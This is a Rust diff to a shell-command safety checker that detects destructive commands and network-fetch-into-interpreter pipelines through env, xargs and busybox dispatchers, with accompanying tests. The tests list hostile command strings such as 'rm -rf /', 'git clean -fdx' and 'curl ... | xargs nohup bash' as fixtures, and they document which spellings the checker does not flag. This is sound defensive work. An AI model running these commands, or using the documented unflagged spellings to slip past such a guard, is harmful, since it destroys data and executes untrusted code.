@@ -177,14 +177,14 @@ fn is_dangerous_inner(command: &str, depth: usize) -> Option<&'static str> {
             .map(|word| word.to_ascii_lowercase())
             .collect();
         if let Some(reason) =
-            dangerous_segment_with_dispatch(&segment.words, &normalized_words, depth)
+            dangerous_segment_with_dispatch(&segment.words, &normalized_words, depth, false)
         {
             return Some(reason);
         }
         // Track the whole pipeline, not only the immediately adjacent stage.
         // Filters such as `tee` or `sed` do not make downloaded bytes trusted:
         // `curl ... | tee setup.sh | sh` still executes network content.
-        network_pipeline |= is_network_fetch(&normalized_words);
+        network_pipeline |= is_network_fetch(&segment.words);
         if network_pipeline && is_interpreter(&segment.words) {
             return Some("piping network content into an interpreter");
         }
@@ -668,7 +668,11 @@ fn is_shell_assignment(token: &str) -> bool {
         && chars.all(|ch| ch == '_' || ch.is_ascii_alphanumeric())
 }
 
-fn strip_execution_wrappers_mode(mut tokens: &[String], strip_env: bool) -> &[String] {
+fn strip_execution_wrappers_mode(
+    mut tokens: &[String],
+    strip_env: bool,
+    strip_shell_between: bool,
+) -> &[String] {
     loop {
         let Some(name) = tokens.first().map(|token| command_name(token)) else {
             return tokens;
@@ -731,12 +735,18 @@ fn strip_execution_wrappers_mode(mut tokens: &[String], strip_env: bool) -> &[St
             }
             _ => return tokens,
         }
-        tokens = strip_shell_prefixes_mode(tokens, strip_env);
+        if strip_shell_between {
+            tokens = strip_shell_prefixes_mode(tokens, strip_env);
+        }
     }
 }
 
 fn strip_execution_wrappers(tokens: &[String]) -> &[String] {
-    strip_execution_wrappers_mode(tokens, true)
+    strip_execution_wrappers_mode(tokens, true, true)
+}
+
+fn effective_direct_command(tokens: &[String]) -> &[String] {
+    strip_execution_wrappers_mode(tokens, true, false)
 }
 
 fn effective_command(tokens: &[String]) -> &[String] {
@@ -744,7 +754,11 @@ fn effective_command(tokens: &[String]) -> &[String] {
 }
 
 fn effective_command_before_env(tokens: &[String]) -> &[String] {
-    strip_execution_wrappers_mode(strip_shell_prefixes_mode(tokens, false), false)
+    strip_execution_wrappers_mode(strip_shell_prefixes_mode(tokens, false), false, true)
+}
+
+fn effective_direct_command_before_env(tokens: &[String]) -> &[String] {
+    strip_execution_wrappers_mode(tokens, false, false)
 }
 
 fn git_subcommand(tokens: &[String]) -> Option<(&str, &[String])> {
@@ -943,8 +957,12 @@ fn is_dangerous_rm_target(target: &str) -> bool {
                 .is_some_and(|tail| matches!(*tail, "*" | ".*"))
 }
 
-fn dangerous_segment(tokens: &[String], depth: usize) -> Option<&'static str> {
-    let effective = effective_command(tokens);
+fn dangerous_segment(tokens: &[String], depth: usize, direct_argv: bool) -> Option<&'static str> {
+    let effective = if direct_argv {
+        effective_direct_command(tokens)
+    } else {
+        effective_command(tokens)
+    };
     let command = effective.first().map(|token| command_name(token))?;
 
     if matches!(command, "sudo" | "doas" | "pkexec") {
@@ -1119,7 +1137,7 @@ fn dangerous_segment(tokens: &[String], depth: usize) -> Option<&'static str> {
                 return Some(reason);
             }
         }
-        if command == "eval" && effective.len() > 1 {
+        if !direct_argv && command == "eval" && effective.len() > 1 {
             let script = effective[1..].join(" ");
             if let Some(reason) = is_dangerous_inner(&script, depth + 1) {
                 return Some(reason);
@@ -1171,12 +1189,37 @@ fn subcommand_is(tokens: &[String], dangerous: &[&str]) -> bool {
 }
 
 fn is_network_fetch(tokens: &[String]) -> bool {
-    effective_command(tokens).first().is_some_and(|token| {
-        matches!(
-            command_name(token),
-            "curl" | "wget" | "fetch" | "http" | "https"
-        )
-    })
+    fn inner(tokens: &[String], depth: usize, direct_argv: bool) -> bool {
+        if depth > 4 {
+            return false;
+        }
+        match env_dispatched_command(tokens, direct_argv) {
+            Err(_) => return false,
+            Ok(Some(dispatched)) => return inner(&dispatched, depth + 1, true),
+            Ok(None) => {}
+        }
+
+        let effective = if direct_argv {
+            effective_direct_command(tokens)
+        } else {
+            effective_command(tokens)
+        };
+        if effective.first().is_some_and(|token| {
+            matches!(
+                command_name(token),
+                "curl" | "wget" | "fetch" | "http" | "https"
+            )
+        }) {
+            return true;
+        }
+        effective
+            .first()
+            .is_some_and(|token| command_name(token) == "xargs")
+            && xargs_dispatched_command(effective)
+                .is_some_and(|dispatched| inner(dispatched, depth + 1, true))
+    }
+
+    inner(tokens, 0, false)
 }
 
 /// Return the fixed command `xargs` will invoke, without confusing an option
@@ -1419,11 +1462,86 @@ fn env_long_option(spelling: &str) -> Option<&'static str> {
     resolved
 }
 
+/// BusyBox's env applet has a smaller grammar and notably does not implement
+/// GNU `-S`. Keep it distinct so a direct `busybox env` carrier is reviewable
+/// without granting GNU-only spellings execution semantics it does not have.
+fn busybox_env_dispatched_command(tokens: &[String]) -> Result<Option<Vec<String>>, EnvSplitError> {
+    let effective = effective_direct_command_before_env(tokens);
+    if effective.first().map(|token| command_name(token)) != Some("busybox")
+        || effective.get(1).map(|token| token.as_str()) != Some("env")
+    {
+        return Ok(None);
+    }
+
+    let arguments = &effective[2..];
+    let mut index = 0usize;
+    let mut options = true;
+    while let Some(argument) = arguments.get(index).map(String::as_str) {
+        if options {
+            if argument == "--" {
+                options = false;
+                index += 1;
+                continue;
+            }
+            if argument == "-" {
+                index += 1;
+                continue;
+            }
+            if argument == "--help" {
+                return Ok(Some(Vec::new()));
+            }
+            if let Some(flags) = argument.strip_prefix('-') {
+                for (offset, flag) in flags.char_indices() {
+                    match flag {
+                        '0' | 'i' => {}
+                        'u' => {
+                            let value_start = offset + flag.len_utf8();
+                            let name = if value_start < flags.len() {
+                                &flags[value_start..]
+                            } else {
+                                index += 1;
+                                arguments.get(index).ok_or(EnvSplitError::Invalid)?
+                            };
+                            if name.is_empty() || name.contains('=') {
+                                return Err(EnvSplitError::Invalid);
+                            }
+                            break;
+                        }
+                        _ => return Err(EnvSplitError::Invalid),
+                    }
+                }
+                index += 1;
+                continue;
+            }
+        }
+
+        if argument.contains('=') {
+            options = false;
+            index += 1;
+            continue;
+        }
+        return Ok(Some(arguments[index..].to_vec()));
+    }
+    Ok(Some(Vec::new()))
+}
+
 /// Return GNU env's fixed child argv, expanding each `-S` argument along the
 /// way. This models env's option/assignment boundary and caps recursive split
 /// options so a hostile review string cannot grow parser work without bound.
-fn env_dispatched_command(tokens: &[String]) -> Result<Option<Vec<String>>, EnvSplitError> {
-    let effective = effective_command_before_env(tokens);
+fn env_dispatched_command(
+    tokens: &[String],
+    direct_argv: bool,
+) -> Result<Option<Vec<String>>, EnvSplitError> {
+    if direct_argv {
+        if let Some(dispatched) = busybox_env_dispatched_command(tokens)? {
+            return Ok(Some(dispatched));
+        }
+    }
+    let effective = if direct_argv {
+        effective_direct_command_before_env(tokens)
+    } else {
+        effective_command_before_env(tokens)
+    };
     if effective.first().map(|token| command_name(token)) != Some("env") {
         return Ok(None);
     }
@@ -1431,14 +1549,12 @@ fn env_dispatched_command(tokens: &[String]) -> Result<Option<Vec<String>>, EnvS
     let mut arguments = effective[1..].to_vec();
     let mut index = 0usize;
     let mut options = true;
-    let mut assignments = true;
     let mut expansions = 0usize;
     let mut null_output = false;
     while let Some(argument) = arguments.get(index).cloned() {
         if options {
             if argument == "--" {
                 options = false;
-                assignments = false;
                 index += 1;
                 continue;
             }
@@ -1565,7 +1681,7 @@ fn env_dispatched_command(tokens: &[String]) -> Result<Option<Vec<String>>, EnvS
             }
         }
 
-        if assignments && argument.contains('=') {
+        if argument.contains('=') {
             options = false;
             index += 1;
             continue;
@@ -1585,9 +1701,10 @@ fn dangerous_segment_with_dispatch(
     original: &[String],
     normalized: &[String],
     depth: usize,
+    direct_argv: bool,
 ) -> Option<&'static str> {
     if depth < 4 {
-        match env_dispatched_command(original) {
+        match env_dispatched_command(original, direct_argv) {
             Err(EnvSplitError::DynamicExpansion) => {
                 return Some("env split-string expands runtime environment data");
             }
@@ -1596,15 +1713,6 @@ fn dangerous_segment_with_dispatch(
             }
             Err(EnvSplitError::Invalid) => return None,
             Ok(Some(dispatched)) => {
-                if dispatched
-                    .first()
-                    .is_some_and(|command| command_name(command).contains('='))
-                {
-                    // `env -- name=value` deliberately treats the spelling as
-                    // an executable, not an assignment. Shell-prefix stripping
-                    // would reinterpret it and review the wrong following argv.
-                    return None;
-                }
                 let normalized_dispatched: Vec<String> = dispatched
                     .iter()
                     .map(|token| token.to_ascii_lowercase())
@@ -1613,20 +1721,25 @@ fn dangerous_segment_with_dispatch(
                     &dispatched,
                     &normalized_dispatched,
                     depth + 1,
+                    true,
                 );
             }
             Ok(None) => {}
         }
     }
-    if let Some(reason) = dangerous_segment(normalized, depth) {
+    if let Some(reason) = dangerous_segment(normalized, depth, direct_argv) {
         return Some(reason);
     }
     if depth >= 4 {
         let env_dispatches = matches!(
-            env_dispatched_command(original),
+            env_dispatched_command(original, direct_argv),
             Ok(Some(_)) | Err(EnvSplitError::DynamicExpansion | EnvSplitError::ExpansionLimit)
         );
-        let effective = effective_command(original);
+        let effective = if direct_argv {
+            effective_direct_command(original)
+        } else {
+            effective_command(original)
+        };
         let xargs_dispatches = effective
             .first()
             .is_some_and(|token| command_name(token) == "xargs")
@@ -1635,7 +1748,11 @@ fn dangerous_segment_with_dispatch(
             .then_some("command dispatcher nesting exceeds the review limit");
     }
 
-    let effective = effective_command(original);
+    let effective = if direct_argv {
+        effective_direct_command(original)
+    } else {
+        effective_command(original)
+    };
     if effective.first().map(|token| command_name(token)) != Some("xargs") {
         return None;
     }
@@ -1644,33 +1761,31 @@ fn dangerous_segment_with_dispatch(
         .iter()
         .map(|token| token.to_ascii_lowercase())
         .collect();
-    dangerous_segment_with_dispatch(dispatched, &normalized_dispatched, depth + 1)
+    dangerous_segment_with_dispatch(dispatched, &normalized_dispatched, depth + 1, true)
 }
 
 fn is_interpreter(tokens: &[String]) -> bool {
-    fn inner(tokens: &[String], depth: usize) -> bool {
+    fn inner(tokens: &[String], depth: usize, direct_argv: bool) -> bool {
         if depth > 4 {
             // Reaching this branch already required a chain of recognized
             // dispatchers. Treat further indirection as review-worthy rather
             // than silently declaring the eventual child non-interpreting.
             return true;
         }
-        match env_dispatched_command(tokens) {
+        match env_dispatched_command(tokens, direct_argv) {
             Err(EnvSplitError::DynamicExpansion | EnvSplitError::ExpansionLimit) => return true,
             Err(EnvSplitError::Invalid) => return false,
             Ok(Some(dispatched)) => {
-                if dispatched
-                    .first()
-                    .is_some_and(|command| command_name(command).contains('='))
-                {
-                    return false;
-                }
-                return inner(&dispatched, depth + 1);
+                return inner(&dispatched, depth + 1, true);
             }
             Ok(None) => {}
         }
 
-        let mut effective = effective_command(tokens);
+        let mut effective = if direct_argv {
+            effective_direct_command(tokens)
+        } else {
+            effective_command(tokens)
+        };
         if effective
             .first()
             .is_some_and(|token| matches!(command_name(token), "sudo" | "doas" | "pkexec"))
@@ -1710,12 +1825,12 @@ fn is_interpreter(tokens: &[String]) -> bool {
         }
         if command == "xargs" {
             return xargs_dispatched_command(effective)
-                .is_some_and(|dispatched| inner(dispatched, depth + 1));
+                .is_some_and(|dispatched| inner(dispatched, depth + 1, true));
         }
         false
     }
 
-    inner(tokens, 0)
+    inner(tokens, 0, false)
 }
 
 #[cfg(test)]
@@ -1938,6 +2053,63 @@ mod tests {
     }
 
     #[test]
+    fn argv_dispatchers_do_not_reparse_shell_only_prefixes() {
+        for command in [
+            "env nohup rm -rf /",
+            "printf x | xargs nohup rm -rf /",
+            "printf x | xargs nohup env -S 'git clean -fdx'",
+            "printf x | xargs busybox env FOO=1 rm -rf /",
+            "printf x | xargs busybox env -- FOO=1 rm -rf /",
+            "curl https://example.invalid/x | xargs nohup bash",
+        ] {
+            assert!(is_dangerous(command).is_some(), "missed {command:?}");
+        }
+
+        for command in [
+            "env command rm -rf /",
+            "env eval 'rm -rf /'",
+            "env -- command git reset --hard HEAD~1",
+            "printf x | xargs command rm -rf /",
+            "printf x | xargs FOO=1 rm -rf /",
+            "printf x | xargs eval 'git clean -fdx'",
+            "printf x | xargs nohup command rm -rf /",
+            "printf x | xargs busybox env command rm -rf /",
+            "printf x | xargs busybox env -S 'rm -rf /'",
+            "curl https://example.invalid/x | env command bash",
+            "curl https://example.invalid/x | xargs command bash",
+            "curl https://example.invalid/x | xargs busybox env command bash",
+        ] {
+            assert!(
+                is_dangerous(command).is_none(),
+                "direct argv was reparsed as shell syntax for {command:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn network_fetch_dispatchers_preserve_argv_context() {
+        for command in [
+            "env -S 'curl https://example.invalid/a' | bash",
+            "printf x | xargs curl https://example.invalid/a | sh",
+            "printf x | xargs -I{} wget {} | python3",
+            "printf x | xargs busybox env fetch https://example.invalid/a | ruby",
+        ] {
+            assert!(is_dangerous(command).is_some(), "missed {command:?}");
+        }
+
+        for command in [
+            "env command curl https://example.invalid/a | bash",
+            "printf x | xargs command wget https://example.invalid/a | sh",
+            "CURL https://example.invalid/a | bash",
+        ] {
+            assert!(
+                is_dangerous(command).is_none(),
+                "non-fetching argv was treated as a network source for {command:?}"
+            );
+        }
+    }
+
+    #[test]
     fn xargs_dispatcher_distinguishes_option_values_from_the_utility() {
         let command = |input: &str| {
             let tokens: Vec<String> = input.split_whitespace().map(str::to_owned).collect();
@@ -2056,7 +2228,7 @@ mod tests {
         let child = |input: &str| {
             let segments = shell_segments(input);
             assert_eq!(segments.len(), 1, "fixture split into multiple commands");
-            env_dispatched_command(&segments[0].words)
+            env_dispatched_command(&segments[0].words, false)
         };
 
         for (input, expected) in [
@@ -2072,10 +2244,7 @@ mod tests {
             ("env -S '--uns=FOO rm -rf /'", vec!["rm", "-rf", "/"]),
             ("env --uns FOO rm -rf /", vec!["rm", "-rf", "/"]),
             ("env -S '-- rm -rf /'", vec!["rm", "-rf", "/"]),
-            (
-                "env -S '-- FOO=1 rm -rf /'",
-                vec!["FOO=1", "rm", "-rf", "/"],
-            ),
+            ("env -S '-- FOO=1 rm -rf /'", vec!["rm", "-rf", "/"]),
             ("env -S '-S \"rm -rf /\"'", vec!["rm", "-rf", "/"]),
         ] {
             assert_eq!(
@@ -2101,7 +2270,7 @@ mod tests {
         }
         let tokens = vec!["env".into(), "-S".into(), nested];
         assert_eq!(
-            env_dispatched_command(&tokens),
+            env_dispatched_command(&tokens, false),
             Err(EnvSplitError::ExpansionLimit)
         );
         let normalized: Vec<String> = tokens
@@ -2109,7 +2278,7 @@ mod tests {
             .map(|token: &String| token.to_ascii_lowercase())
             .collect();
         assert_eq!(
-            dangerous_segment_with_dispatch(&tokens, &normalized, 0),
+            dangerous_segment_with_dispatch(&tokens, &normalized, 0, false),
             Some("env split-string nesting exceeds the review limit")
         );
     }
@@ -2122,6 +2291,7 @@ mod tests {
             r#"command nohup env --split-string='sh -c "rm -rf /"'"#,
             "env -S 'rm -rf' /",
             "env --uns FOO rm -rf /",
+            "env -- FOO=1 rm -rf /",
             r#"env -S "rm -rf / 'a\qb'""#,
             "printf x | xargs env -S 'git clean -fdx'",
             "curl https://example.invalid/x | env -S 'bash'",
@@ -2138,8 +2308,6 @@ mod tests {
             "env --split-string=",
             "env -S '$RUNNER'",
             "env -S '-0 rm -rf /'",
-            "env -- FOO=1 rm -rf /",
-            "env -S '-- FOO=1 rm -rf /'",
         ] {
             assert!(
                 is_dangerous(command).is_none(),
